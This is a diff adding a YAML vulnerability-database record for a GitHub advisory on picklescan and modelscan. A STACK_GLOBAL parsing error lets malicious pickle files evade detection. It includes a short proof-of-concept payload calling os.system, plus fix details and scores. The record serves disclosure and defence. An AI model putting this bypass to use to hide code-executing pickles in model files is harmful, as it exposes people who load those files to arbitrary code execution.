@@ -1,0 +1,58 @@
+advisory_id: GHSA-9gvj-pp9x-gcfr
+datasource_id: github_osv_importer_v2/GHSA-9gvj-pp9x-gcfr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-9gvj-pp9x-gcfr/GHSA-9gvj-pp9x-gcfr.json
+aliases: []
+summary: "Picklescan has pickle parsing logic flaw that leads to malicious pickle file bypass\n\
+  ### Details\nThere's a parsing logic error in picklescan and modelscan while trying to deal\
+  \ with opcode `STACK_GLOBAL`.\nFunction `_list_globals` when handling `STACK_GLOBAL` at position\
+  \ `n`, it is expected to track two arguments but in wrong range. The loop only consider the\
+  \ range from `1` to `n-1` but forgets to consider the opcode at position `0`. The correct\
+  \ range should be `0` to `n-1`. Attacker can put arg in position `0`, thus the parser can\
+  \ only tract one argument. Then, the exception https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/scanner.py#L281\
+  \ will be triggered. Thus it can cause detection bypass since the malicious pickle file will\
+  \ trigger unexpected exceptions.\n\nExample:\n```\n    0: S    STRING     'os' --> arg 0:\
+  \ STRING (untracked argument due to wrong scanning range)\n    6: S    STRING     'system'\
+  \ --> arg 1: STRING (tracked argument)\n   16: \\x93 STACK_GLOBAL\n   17: S    STRING    \
+  \ 'ls'\n   23: \\x85 TUPLE1\n   24: R    REDUCE\n   25: .    STOP\n```\n\n\n### PoC\n``` python\n\
+  import pickle\npayload = b\"S'os'\\nS'system'\\n\\x93S'ls'\\n\\x85R.\"\nwith open('bad_pickle.pkl',\
+  \ 'wb') as f:\n    f.write(payload)\npickle.load(open('bad_pickle.pkl', 'rb'))\n```\n\n###\
+  \ Impact\nDetection bypass in both picklescan and modelscan. Note that it also affects the\
+  \ online hugging face pickle scanners, making the malicious pickle file bypass the detection.\
+  \ \n\n### Fix\nTo fix the range here, change `range(1, n)` to `range(1, n+1)` to ensure that\
+  \ `n-offset` stays within the range of `0` to `n`.\nhttps://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/scanner.py#L255"
+impacted_packages:
+  - purl: pkg:pypi/picklescan
+    affected_versions: vers:pypi/<0.0.27
+    fixed_versions: vers:pypi/0.0.27
+severities:
+  - score: '8.9'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/08/GHSA-9gvj-pp9x-gcfr/GHSA-9gvj-pp9x-gcfr.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-502
+references:
+  - url: https://github.com/mmaitre314/picklescan
+    reference_type:
+    reference_id:
+  - url: https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/scanner.py#L255
+    reference_type:
+    reference_id:
+  - url: https://github.com/mmaitre314/picklescan/blob/2a8383cfeb4158567f9770d86597300c9e508d0f/src/picklescan/scanner.py#L281
+    reference_type:
+    reference_id:
+  - url: https://github.com/mmaitre314/picklescan/commit/58983e1c20973ac42f2df7ff15d7c8cd32f9b688
+    reference_type:
+    reference_id:
+  - url: https://github.com/mmaitre314/picklescan/releases/tag/v0.0.27
+    reference_type:
+    reference_id:
+  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9gvj-pp9x-gcfr
+    reference_type:
+    reference_id:
